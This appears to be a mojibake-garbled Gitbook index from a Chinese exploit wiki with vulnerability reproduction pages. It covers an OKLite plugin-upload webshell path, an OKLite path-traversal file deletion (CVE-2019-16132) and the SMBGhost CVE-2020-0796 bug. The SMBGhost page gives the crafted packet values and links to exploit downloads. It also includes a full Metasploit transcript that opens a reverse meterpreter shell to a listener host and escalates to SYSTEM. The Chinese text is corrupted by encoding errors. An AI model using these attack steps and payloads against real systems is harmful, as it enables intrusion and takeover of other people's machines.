$this->json(P_Lang('æ’ä»¶æ‰“åŒ…æ¨¡å¼æœ‰é—®é¢˜')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); } è¿™é‡Œå¯ä»¥çœ‹åˆ°éœ€è¦ä¸Šä¼ ZIPå‹ç¼©åŒ…æ ¼å¼çš„æ’ä»¶ï¼Œè·Ÿè¿›zip_infoå‡½æ•° å‡½æ•°ä½ç½® framework/libs/phpzip.php è¿™é‡Œä¼šè¿”å›å…³äºZIPå‹ç¼©åŒ…çš„ä¸€äº›ä¿¡æ¯ å¾€ä¸‹çœ‹å…³é”®ä½ç½® $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('æ’ä»¶æœ‰å¼‚å¸¸')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('æ’ä»¶å·²å­˜åœ¨ï¼Œä¸å…è®¸é‡å¤è§£å‹')); } if(!$info[1]){ $this->json(P_Lang('æ’ä»¶æ‰“åŒ…æ¨¡å¼æœ‰é—®é¢˜')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); è¿™é‡Œç”¨ explodeå‡½æ•°ä»¥ / åˆ†éš”è¿”å›ä¸¤ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ ¼å¼åº”ä¸º AAA/BBBè¿™æ ·çš„ç›®å½•æ ¼å¼ï¼Œç›´æ¥ä¸Šä¼ ZIPæ–‡ä»¶åˆ™ä¼šæŠ¥é”™ æ’ä»¶æ‰“åŒ…æ¨¡å¼æœ‰é—®é¢˜ åœ¨è¿™é‡Œä¸Šä¼ ä¸€ä¸ªZIPæ–‡ä»¶ï¼Œæ ¼å¼è¦æ˜¯è§£å‹å‡ºæ¥ä¸ºç›®å½•ï¼Œç›®å½•ä¸­å«PHPæ–‡ä»¶å°±è¡Œäº† $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); æœ€åä¸¤è¡Œå‘Šè¯‰äº†æ–‡ä»¶è§£å‹çš„ä½ç½®ï¼Œä¸Šä¼ çš„æ–‡ä»¶åœ¨ pluginsç›®å½•ä¸‹ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132.html","title":"OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132","keywords":"","body":"OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132 æ¼æ´æè¿° OKLite 1.2.25 åå°é£æ ¼æ¨¡å—å­˜åœ¨ å¯¹å±é™©å­—ç¬¦æœªè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥åˆ é™¤ä»»æ„ç›®å½•å’Œæ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] OKLite 1.2.25 æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„å‡½æ•°åœ¨æ–‡ä»¶ framework/admin/tpl_control.php ä¸­çš„ delfile_f() å‡½æ•° è¿™é‡Œåˆ é™¤æ–‡ä»¶ä¸»è¦è°ƒç”¨äº† rmå‡½æ•°, ä½ç½®åœ¨ framework/libs/file.php /** * åˆ é™¤æ“ä½œï¼Œè¯·ä¸€å®šè¦å°å¿ƒï¼Œåœ¨ç¨‹åºä¸­æœ€å¥½ä¸¥æ ¼ä¸€äº›ï¼Œä¸ç„¶æœ‰å¯èƒ½å°†æ•´ä¸ªç›®å½•åˆ æ‰ * @å‚æ•° $del è¦åˆ é™¤çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ * @å‚æ•° $type ä»…æ”¯æŒfileå’Œfolderï¼Œä¸ºfileæ—¶ä»…åˆ é™¤$delæ–‡ä»¶ï¼Œå¦‚æœ$delä¸ºæ–‡ä»¶å¤¹ï¼Œè¡¨ç¤ºåˆ é™¤å…¶ä¸‹é¢çš„æ–‡ä»¶ã€‚ä¸ºfolderæ—¶ï¼Œè¡¨ç¤ºåˆ é™¤$delè¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœä¸ºæ–‡ä»¶å¤¹ï¼Œè¡¨ç¤ºåˆ é™¤æ­¤æ–‡ä»¶å¤¹åŠå­é¡¹ * @è¿”å› true/false **/ public function rm($del,$type=\"file\") { if(!file_exists($del)){ return false; } if(is_file($del)){ unlink($del); return true; } $array = $this->_dir_list($del); if(!$array){ if($type == 'folder'){ rmdir($del); } return true; } foreach($array as $key=>$value){ if(file_exists($value)){ if(is_dir($value)){ $this->rm($value,$type); }else{ unlink($value); } } } if($type == \"folder\"){ rmdir($del); } return true; } è¿™é‡Œå¯¹ä¼ å…¥çš„å‚æ•°éå†ï¼Œè·å¾—çš„æ–‡ä»¶åæˆ–æ–‡ä»¶å¤¹è¿›è¡Œåˆ é™¤ å›è¿‡å¤´çœ‹ è°ƒç”¨getå‡½æ•°ä¼ å…¥å‚æ•°æ—¶æ˜¯å¦æœ‰å¯¹ ../ çš„è¿‡æ»¤ å¯ä»¥çœ‹åˆ°å‚æ•°æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œä½¿ç”¨è¿™é‡Œçš„æ¼æ´è¿›è¡Œä»»æ„æ–‡ä»¶åˆ é™¤ æŠ“åŒ…ä¿®æ”¹æˆåŠŸåˆ é™¤æ–‡ä»¶ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/","title":"æ“ä½œç³»ç»Ÿæ¼æ´","keywords":"","body":"æ“ä½œç³»ç»Ÿæ¼æ´ğŸº WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/","title":"Windows","keywords":"","body":"Windows Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· CVE-2020-0796 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/æ‰«æå·¥å…· CVE-2020-0796.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/æ‰«æå·¥å…· CVE-2020-0796.html","title":"æ‰«æå·¥å…· CVE-2020-0796","keywords":"","body":"æ‰«æå·¥å…· CVE-2020-0796 Scanç›®å½•ä»¥æ”¾é’ˆå¯¹ CVE-2020-0796 4ç§ä¸åŒåˆ©ç”¨æ–¹å¼çš„POC å¥‡å®‰ä¿¡ CVE-2020-0796 æ‰«æä¸‹è½½ Github CVE-2020-0796 è“å±EXP ä¸‹è½½ Github CVE-2020-0796 æœ¬åœ°ææƒEXP ä¸‹è½½ Github CVE-2020-0796 RCE EXP WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796.html","title":"Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796","keywords":"","body":"Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796 æ¼æ´æè¿° 2020å¹´3æœˆ10æ—¥ï¼Œå¾®è½¯åœ¨å…¶å®˜æ–¹SRCå‘å¸ƒäº†CVE-2020-0796çš„å®‰å…¨å…¬å‘Šï¼ˆADV200005ï¼ŒMicrosoftGuidance for Disabling SMBv3 Compressionï¼‰,å…¬å‘Šè¡¨ç¤ºåœ¨Windows SMBv3ç‰ˆæœ¬çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚åŒæ—¶æŒ‡å‡ºè¯¥æ¼æ´å­˜åœ¨äºMicroSoft Server Message Block 3.1.1åè®®å¤„ç†ç‰¹å®šè¯·æ±‚åŒ…çš„åŠŸèƒ½ä¸­ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯åœ¨ç›®æ ‡SMB Serveræˆ–è€…Clientä¸­æ‰§è¡Œä»»æ„ä»£ç  æ¼æ´å½±å“ [!NOTE] SMBç‰ˆæœ¬ v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) ç¯å¢ƒæ­å»º åœ¨MSDNä¸Šä¸‹è½½å¯¹åº”çš„å­˜åœ¨æ¼æ´çš„ç³»ç»Ÿç‰ˆæœ¬ å®‰è£…åæ‰§è¡Œå‘½ä»¤ winver æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦å«æœ‰ KB4551762è¡¥ä¸ æ¼æ´å¤ç° æ¼æ´åŸç† CVE-2020-0796æ¼æ´å­˜åœ¨äºå—å½±å“ç‰ˆæœ¬çš„Windowsé©±åŠ¨srv2.sysä¸­ã€‚Windows SMB v3.1.1 ç‰ˆæœ¬å¢åŠ äº†å¯¹å‹ç¼©æ•°æ®çš„æ”¯æŒã€‚å›¾2æ‰€ç¤ºä¸ºå¸¦å‹ç¼©æ•°æ®çš„SMBæ•°æ®æŠ¥æ–‡çš„æ„æˆã€‚ ProtocolIdï¼š4å­—èŠ‚ï¼Œå›ºå®šä¸º0x424D53FC OriginalComressedSegmentSizeï¼š4å­—èŠ‚ï¼ŒåŸå§‹çš„æœªå‹ç¼©æ•°æ®å¤§å° CompressionAlgorithmï¼š2å­—èŠ‚ï¼Œå‹ç¼©ç®—æ³• Flagsï¼š2å­—èŠ‚ï¼Œè¯¦è§åè®®æ–‡æ¡£ Offset/Lengthï¼šæ ¹æ®Flagsçš„å–å€¼ä¸ºOffsetæˆ–è€…Lengthï¼ŒOffsetè¡¨ç¤ºæ•°æ®åŒ…ä¸­å‹ç¼©æ•°æ®ç›¸å¯¹äºå½“å‰ç»“æ„çš„åç§» srv2.sysä¸­å¤„ç†SMBv3å‹ç¼©æ•°æ®åŒ…çš„è§£å‹å‡½æ•°Srv2DecompressDataæœªä¸¥æ ¼æ ¡éªŒæ•°æ®åŒ…ä¸­OriginalCompressedSegmentSizeå’ŒOffset/Lengthå­—æ®µçš„åˆæ³•æ€§ã€‚è€Œè¿™ä¸¤ä¸ªå­—æ®µå½±å“äº†Srv2DecompressDataä¸­å†…å­˜åˆ†é…å‡½æ•°SrvNetAllocateBufferçš„å‚æ•°ã€‚å¦‚å›¾4æ‰€ç¤ºçš„Srv2DecompressDataå‡½æ•°åç¼–è¯‘ä»£ç ï¼ŒSrvNetAllocateBufferå®é™…çš„å‚æ•°ä¸ºOriginalCompressedSegmentSize+Offsetã€‚è¿™ä¸¤ä¸ªå‚æ•°éƒ½ç›´æ¥æ¥æºäºæ•°æ®åŒ…ä¸­SMB Compression Transform Headerä¸­çš„å­—æ®µï¼Œè€Œå‡½æ•°å¹¶æœªåˆ¤æ–­è¿™ä¸¤ä¸ªå­—æ®µæ˜¯å¦åˆæ³•ï¼Œå°±ç›´æ¥å°†å…¶ç›¸åŠ åä½œä¸ºå†…å­˜åˆ†é…çš„å‚æ•°(unsigned intç±»å‹ï¼‰ã€‚ è¿™é‡Œï¼ŒOriginalCompressedSegmentSize+Offsetå¯èƒ½å°äºå®é™…éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œä»è€Œåœ¨åç»­è°ƒç”¨è§£å‹å‡½æ•°SmbCompressionDecompressè¿‡ç¨‹ä¸­å­˜åœ¨è¶Šç•Œè¯»å–æˆ–è€…å†™å…¥çš„é£é™©ã€‚ ç›®å‰å·²å…¬å¼€çš„é’ˆå¯¹è¯¥æ¼æ´çš„æœ¬åœ°ææƒåˆ©ç”¨åŒ…å«å¦‚ä¸‹çš„ä¸»è¦è¿‡ç¨‹ï¼š ï¼ˆ1ï¼‰éªŒè¯ç¨‹åºé¦–å…ˆåˆ›å»ºåˆ°SMS serverçš„ä¼šè¯è¿æ¥ï¼ˆè®°ä¸ºsessionï¼‰ã€‚ ï¼ˆ2ï¼‰éªŒè¯ç¨‹åºè·å–è‡ªèº«tokenæ•°æ®ç»“æ„ä¸­privilegeæˆå‘˜åœ¨å†…æ ¸ä¸­çš„åœ°å€ï¼ˆè®°tokenAddrï¼‰ã€‚ ï¼ˆ3ï¼‰éªŒè¯ç¨‹åºé€šè¿‡sessionå‘é€ç•¸å½¢å‹ç¼©æ•°æ®ï¼ˆè®°ä¸ºevilDataï¼‰ç»™SMB serverè§¦å‘æ¼æ´ã€‚å…¶ä¸­ï¼ŒevilDataåŒ…å«tokenAddrã€æƒé™æ•°æ®ã€æº¢å‡ºå ä½æ•°æ®ã€‚ ï¼ˆ4ï¼‰ SMS serveræ”¶åˆ°evilDataåè§¦å‘æ¼æ´ï¼Œå¹¶ä¿®æ”¹tokenAddråœ°å€å¤„çš„æƒé™æ•°æ®ï¼Œä»è€Œæå‡éªŒè¯ç¨‹åºçš„æƒé™ã€‚ ï¼ˆ5ï¼‰éªŒè¯ç¨‹åºè·å–æƒé™åå¯¹winlogonè¿›è¡Œæ§åˆ¶ï¼Œæ¥åˆ›å»ºsystemç”¨æˆ·shellã€‚ é¦–å…ˆï¼Œçœ‹ä¸€ä¸‹å·²å…¬å¼€åˆ©ç”¨çš„evilDataæ•°æ®åŒ… æ•°æ®åŒ…çš„å†…å®¹å¾ˆç®€å•ï¼Œå…¶ä¸­å‡ ä¸ªå…³é”®å­—æ®µæ•°æ®å¦‚ä¸‹ï¼š OriginalSize ï¼š0xffffffff Offsetï¼š0x10 Real compressed data ï¼š13å­—èŠ‚çš„å‹ç¼©æ•°æ®ï¼Œè§£å‹ååº”ä¸º1108å­—èŠ‚â€™Aâ€™åŠ 8å­—èŠ‚çš„tokenåœ°å€ã€‚ SMB3 raw data ï¼šå®é™…ä¸Šæ˜¯ç”±2ä¸ª8å­—èŠ‚çš„0x1FF2FFFFBCï¼ˆæ€»é•¿0x10)åŠ ä¸Š0x13å­—èŠ‚çš„å‹ç¼©æ•°æ®ç»„æˆ ä»ä¸Šé¢çš„æ¼æ´åŸç†åˆ†æå¯çŸ¥ï¼Œæ¼æ´æˆå› æ˜¯Srv2DecompressDataå‡½æ•°å¯¹æŠ¥æ–‡å­—æ®µç¼ºä¹åˆæ³•æ€§åˆ¤æ–­é€ æˆå†…å­˜åˆ†é…ä¸å½“ã€‚åœ¨è¯¥æ¼æ´æ•°æ®åŒ…ä¸­ï¼ŒOriginalSize æ˜¯ä¸€ä¸ªç•¸å½¢å€¼ã€‚OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf æ˜¯ä¸€ä¸ªå¾ˆå°çš„å€¼ï¼Œå…¶å°†ä¼šä¼ é€’ç»™SrvNetAllocateBufferè¿›è¡Œè°ƒç”¨ï¼Œä¸‹é¢å…·ä½“åˆ†æå†…å­˜åˆ†é…æƒ…å†µã€‚SrvNetAllocateBufferçš„åç¼–è¯‘ä»£ç  ç”±äºä¼ ç»™SrvNetAllocateBufferçš„å‚æ•°ä¸º0xfï¼Œæ ¹æ®SrvNetAllocateBufferçš„å¤„ç†æµç¨‹å¯çŸ¥ï¼Œè¯¥è¯·æ±‚å†…å­˜å°†ä»SrvNetBufferLookasidesè¡¨ä¸­åˆ†é…ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå˜é‡SrvDisableNetBufferLookAsideListè·Ÿæ³¨å†Œè¡¨é¡¹ç›¸å…³ï¼Œç³»ç»Ÿé»˜è®¤çŠ¶æ€ä¸‹SrvDisableNetBufferLookAsideListä¸º0ã€‚ SrvNetBufferLookasidesè¡¨é€šè¿‡å‡½æ•°SrvNetCreateBufferåˆå§‹åŒ–ï¼Œå®é™…SrvNetCreateBufferå¾ªç¯è°ƒç”¨äº†SrvNetBufferLookasideAllocateåˆ†é…å†…å­˜ï¼Œè°ƒç”¨SrvNetBufferLookasideAllocateçš„å‚æ•°åˆ†åˆ«ä¸º[â€˜0x1100â€™, â€˜0x2100â€™, â€˜0x4100â€™, â€˜0x8100â€™, â€˜0x10100â€™, â€˜0x20100â€™, â€˜0x40100â€™, â€˜0x80100â€™, â€˜0x100100â€™]ã€‚åœ¨è¿™é‡Œï¼Œå†…å­˜åˆ†é…å‚æ•°ä¸º0xfï¼Œå¯¹åº”çš„lookasideè¡¨ä¸º0x1100å¤§å°çš„è¡¨é¡¹ã€‚ SrvNetBufferLookasideAllocateå‡½æ•°å®é™…æ˜¯è°ƒç”¨SrvNetAllocateBufferFromPoolæ¥åˆ†é…å†…å­˜ åœ¨å‡½æ•°SrvNetAllocateBufferFromPoolä¸­ï¼Œå¯¹äºç”¨æˆ·è¯·æ±‚çš„å†…å­˜åˆ†é…å¤§å°ï¼Œå†…éƒ¨é€šè¿‡ExAllocatePoolWithTagå‡½æ•°åˆ†é…çš„å†…å­˜å®é™…è¦å¤§äºè¯·æ±‚å€¼ï¼ˆå¤šå‡ºéƒ¨åˆ†ç”¨äºå­˜å‚¨éƒ¨åˆ†å†…å­˜ç›¸å…³æ•°æ®ç»“æ„ï¼‰ã€‚ä»¥è¯·æ±‚åˆ†é…0x1100å¤§å°ä¸ºä¾‹ï¼Œç»è¿‡ä¸€ç³»åˆ—åˆ¤æ–­åï¼Œæœ€ååˆ†é…çš„å†…å­˜å¤§å°allocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)ã€‚ å†…å­˜åˆ†é…å®Œæ¯•ä¹‹åï¼ŒSrvNetAllocateBufferFromPoolå‡½æ•°è¿˜å¯¹åˆ†é…çš„å†…å­˜è¿›è¡Œäº†ä¸€ç³»åˆ—åˆå§‹åŒ–æ“ä½œï¼Œæœ€åè¿”å›äº†ä¸€ä¸ªå†…å­˜ä¿¡æ¯ç»“æ„ä½“æŒ‡é’ˆä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„å¦‚ä¸‹çš„æ•°æ®å…³ç³»ï¼šSrvNetAllocateBufferFromPoolå‡½æ•°è¿”å›å€¼return_bufferæŒ‡å‘ä¸€ä¸ªå†…å­˜æ•°æ®ç»“æ„ï¼Œè¯¥å†…å­˜æ•°æ®ç»“æ„èµ·å§‹åœ°å€åŒå®é™…åˆ†é…å†…å­˜ï¼ˆå‡½æ•°ExAllocatePoolWithTagåˆ†é…çš„å†…å­˜ï¼‰èµ·å§‹åœ°å€çš„çš„åç§»ä¸º0x1150ï¼›return_buffer+0x18ä½ç½®æŒ‡å‘äº†å®é™…åˆ†é…å†…å­˜èµ·å§‹åœ°å€åç§»0x50ä½ç½®å¤„ï¼Œè€Œæœ€ç»ˆreturn_bufferä¼šä½œä¸ºå‡½æ•°SrvNetAllocateBufferçš„è¿”å›å€¼ å›åˆ°æ¼æ´è§£å‹å‡½æ•°Srv2DecompressDataï¼Œåœ¨è¿›è¡Œå†…å­˜åˆ†é…ä¹‹åï¼ŒSrv2DecompressDataè°ƒç”¨å‡½æ•°SmbCompressionDecompresså¼€å§‹è§£å‹è¢«å‹ç¼©çš„æ•°æ® å®é™…ä¸Šï¼Œè¯¥å‡½æ•°è°ƒç”¨äº†Windowsåº“å‡½æ•°RtlDecompressBufferEx2æ¥å®ç°è§£å‹ï¼Œæ ¹æ®RtlDecompressBufferEx2çš„å‡½æ•°åŸå‹æ¥å¯¹åº”åˆ†æSmbCompressionDecompresså‡½æ•°çš„å„ä¸ªå‚æ•°ã€‚ SmbCompressionDecompress(CompressAlgoï¼Œ//å‹ç¼©ç®—æ³• Compressed_bufï¼Œ//æŒ‡å‘æ•°æ®åŒ…ä¸­çš„å‹ç¼©æ•°æ® Compressed_sizeï¼Œ//æ•°æ®åŒ…ä¸­å‹ç¼©æ•°æ®å¤§å°ï¼Œè®¡ç®—å¾—åˆ° UnCompressedBuf,//è§£å‹åçš„æ•°æ®å­˜å‚¨åœ°å€ï¼Œ*(alloc_buffer+0x18)+0x10 UnCompressedSize,//å‹ç¼©æ•°æ®åŸå§‹å¤§å°,æºäºæ•°æ®åŒ…OriginalCompressedSegmentSize FinalUnCompressedSize)//æœ€ç»ˆè§£å‹åæ•°æ®å¤§å° ä»åç¼–è¯‘ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå‡½æ•°SmbCompressionDecompressä¸­ä¿å­˜è§£å‹åæ•°æ®çš„åœ°å€ä¸º*(alloc_buffer+0x18)+0x10çš„ä½ç½®ï¼Œæ ¹æ®å†…å­˜åˆ†é…è¿‡ç¨‹åˆ†æï¼Œalloc_buffer + 0x18æŒ‡å‘äº†å®é™…å†…å­˜åˆ†é…èµ·å§‹ä½ç½®åç§»0x50å¤„ï¼Œæ‰€ä»¥æ‹·è´ç›®çš„åœ°å€ä¸ºå®é™…å†…å­˜åˆ†é…èµ·å§‹åœ°å€åç§»0x60ä½ç½®å¤„ã€‚ åœ¨è§£å‹è¿‡ç¨‹ä¸­ï¼Œå‹ç¼©æ•°æ®è§£å‹åå°†å­˜å‚¨åˆ°è¿™ä¸ªåœ°å€æŒ‡å‘çš„å†…å­˜ä¸­ã€‚æ ¹æ®evilDataæ•°æ®çš„æ„é€ è¿‡ç¨‹ï¼Œè§£å‹åçš„æ•°æ®ä¸ºå å‘æ•°æ®å’ŒtokenAddrã€‚æ‹·è´åˆ°è¯¥å¤„åœ°å€åï¼ŒtokenAddrå°†è¦†ç›–åŸå†…å­˜æ•°æ®ç»“æ„ä¸­alloc_buffer+0x18å¤„çš„æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è§£å‹ç¼©å‡½æ•°SmbCompressionDecompressè¿”å›åï¼Œalloc_buffer+0x18å°†æŒ‡å‘éªŒè¯ç¨‹åºçš„tokenAddrå†…æ ¸åœ°å€ ç»§ç»­çœ‹Srv2DecompressDataçš„åç»­å¤„ç†æµç¨‹ï¼Œè§£å‹æˆåŠŸåï¼Œå‡½æ•°åˆ¤æ–­offsetçš„ç»“æœä¸ä¸º0ã€‚ä¸ä¸º0åˆ™è¿›è¡Œå†…å­˜ç§»åŠ¨ï¼Œå†…å­˜æ‹·è´çš„å‚æ•°å¦‚ä¸‹ï¼š memmove(*(alloc_buffer+0x18)ï¼ŒSMB_payloadï¼Œoffset) æ­¤æ—¶alloc_buffer+0x18å·²ç»æŒ‡å‘éªŒè¯ç¨‹åºçš„tokenAddrå†…æ ¸åœ°å€ï¼Œè€ŒSMB_payloadæ­¤æ—¶æŒ‡å‘evilDataä¸­çš„æƒé™æ•°æ®ï¼Œoffsetåˆ™ä¸º0x10ã€‚å› æ­¤ï¼Œè¿™ä¸ªå†…å­˜ç§»åŠ¨å®Œæˆåï¼Œæƒé™æ•°æ®å°†å†™å…¥tokenAddrå¤„ã€‚è¿™æ„å‘³ç€ï¼ŒSMS ServeræˆåŠŸä¿®æ”¹äº†éªŒè¯ç¨‹åºçš„æƒé™ï¼Œä»è€Œå®ç°äº†éªŒè¯ç¨‹åºçš„ææƒï¼ è¿˜æœ‰ä¸€ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œåœ¨è§£å‹æ—¶ï¼ŒSrv2DecompressDataå‡½æ•°ä¼šåˆ¤æ–­å®é™…çš„è§£å‹åæ•°æ®å¤§å°FinalUnCompressedSizeæ˜¯å¦å’Œæ•°æ®åŒ…ä¸­åŸå§‹æ•°æ®å¤§å°OriginalCompressedSegmentSizeä¸€è‡´ æŒ‰ç†æ¥è¯´å®é™…è§£å‹åçš„æ•°æ®å¤§å°ä¸º0x1100ï¼Œä¸ç­‰äºæ•°æ®åŒ…ä¸­çš„åŸå§‹å‹ç¼©æ•°æ®å¤§å°0xffffffffï¼Œè¿™é‡Œåº”è¯¥è¿›å…¥åˆ°åé¢å†…å­˜é‡Šæ”¾çš„æµç¨‹ã€‚ç„¶è€Œï¼Œå®é™…ä¸Šåœ¨å‡½æ•°SmbCompressionDecompressä¸­ï¼Œè°ƒç”¨RtlDecompressBufferEx2æˆåŠŸåä¼šç›´æ¥å°†OriginalCompressedSegmentSizeèµ‹å€¼ç»™FinalUnCompressedSizeã€‚è¿™ä¹Ÿæ˜¯è¯¥æ¼æ´å…³äºä»»æ„åœ°å€å†™å…¥æˆåŠŸçš„å…³é”®ä¹‹ä¸€ã€‚ CVE-2020-0796 ç›®æ ‡æ¢æµ‹(å¥‡å®‰ä¿¡) ä½¿ç”¨å¥‡å®‰ä¿¡çš„æ¼æ´æ‰«ææ¥æ¢æµ‹ å¥‡å®‰ä¿¡ CVE-2020-0796 æ‰«æä¸‹è½½ CVE-2020-0796 è“å±EXP Github CVE-2020-0796 è“å±EXP ä¸‹è½½ è¿è¡Œè„šæœ¬åç›®æ ‡æˆåŠŸè“å± CVE-2020-0796 æœ¬åœ°ææƒEXP Github CVE-2020-0796 æœ¬åœ°ææƒEXP ä¸‹è½½ è¿è¡Œåº”ç”¨ç¨‹åºåå¼¹å‡ºcmdçª—å£ä¸º systemæƒé™ æˆ–è€…ä½¿ç”¨ MSFçš„å†…ç½®EXP windows/local/cve_2020_0796_smbghost æ¥æœ¬åœ°ææƒ msf6 exploit(multi/handler) > set lhost 192.168.142.19 lhost => 192.168.142.19 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Sending stage (200262 bytes) to 192.168.142.61 [*] Meterpreter session 2 opened (192.168.142.19:4444 -> 192.168.142.61:51757) at 2020-11-08 15:28:20 +0800 meterpreter > meterpreter > getuid Server username: DESKTOP-RL1VAD8\\wy meterpreter > background msf6 exploit(multi/handler) > search cve_2020 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/sap/cve_2020_6287_ws_add_user 2020-07-14 normal Yes SAP Unauthenticated WebService User Creation 1 exploit/linux/misc/cve_2020_13160_anydesk 2020-06-16 normal Yes AnyDesk GUI Format String Write 2 exploit/windows/local/cve_2020_0668_service_tracing 2020-02-11 excellent No Service Tracing Privilege Elevation Vulnerability 3 exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 2020-03-10 excellent Yes Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability 4 exploit/windows/local/cve_2020_0796_smbghost 2020-03-13 good Yes SMBv3 Compression Buffer Overflow Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/cve_2020_0796_smbghost msf6 exploit(multi/handler) > use 4 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/cve_2020_0796_smbghost) > show options Module options (exploit/windows/local/cve_2020_0796_smbghost): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.142.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 10 v1903-1909 x64 msf6 exploit(windows/local/cve_2020_0796_smbghost) > set session 2 session => 2 msf6 exploit(windows/local/cve_2020_0796_smbghost) > check [*] The target appears to be vulnerable. msf6 exploit(windows/local/cve_2020_0796_smbghost) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad to host the exploit... [+] Process 908 launched. [*] Reflectively injecting the exploit DLL into 908... [*] Injecting exploit into 908... [*] Exploit injected. Injecting payload into 908... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (200262 bytes) to 192.168.142.61 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM CVE-2020-0796 RCE EXP Github CVE-2020-0796 RCE EXP 